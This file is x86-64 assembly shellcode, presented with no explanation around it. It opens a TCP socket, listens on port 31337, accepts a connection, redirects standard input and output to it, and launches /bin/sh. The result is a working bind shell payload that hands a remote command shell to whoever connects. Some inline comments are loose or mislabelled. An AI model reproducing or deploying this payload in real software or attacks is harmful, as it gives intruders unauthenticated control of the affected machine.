BITS 64

;s = socket(2, 1, 0)
push BYTE 0x29          ; socket syscall #41(0x29)
pop rax
mov dil, 0x2            ; AF_INET = 2
mov sil, 0x1            ; SOCK_STREAM = 1
xor rdx, rdx            ; protocol = 0
syscall

mov rbx, rax            ; store s(socket fd) in rbx

;bind(s, [2, 31337, 0], 16)
push BYTE 0x31          ; bind syscall #49 (0x31)
pop rax
mov rdi, rbx
xor rsi, rsi
push rsi                ; sin_zero
push rsi                ; build sockaddr struct: INADDR_ANY = 0
push WORD 0x697a        ; (in reverse order) PORT = 31337
push WORD 0x2           ; AF_INET = 2
mov rsi, rsp
mov dl, 16             ; sizeof(struct sockaddr)
syscall

;listen(s, 0)
push BYTE 0x32          ; listen syscall #50(0x32)
pop rax
mov rdi, rbx            ; s
xor rsi, rsi
mov sil, 4              ; SYS_LISTEN = 4
syscall

;c = accept(s, 0, 0)
push BYTE 0x2b          ; accept syscall #43(0x2b)
pop rax
mov rdi, rbx            ; s (this should already be there from listen call?)
xor rsi, rsi
push rsi
push rsi
mov rsi, rsp
push DWORD 16
mov rdx, rsp
syscall

; dup2(int oldfd, int newjd)
mov rdi, rax 		; sockfd of newly accepted connection
push BYTE 0x21
pop rax
xor rsi, rsi
syscall
mov BYTE al, 0x21
mov sil, 0x1;rsi, 0x1
syscall
mov BYTE al, 0x21
mov sil, 0x2;rsi, 0x2
syscall

; int execve(const char *filename, char * const argv[], char * const envp[])
xor rax, rax
push rax
mov QWORD rbx, "//bin/sh"
push rbx
mov rdi, rsp
push rax
mov rdx, rsp
push rdi
mov rsi, rsp
mov al, 0x3b
syscall

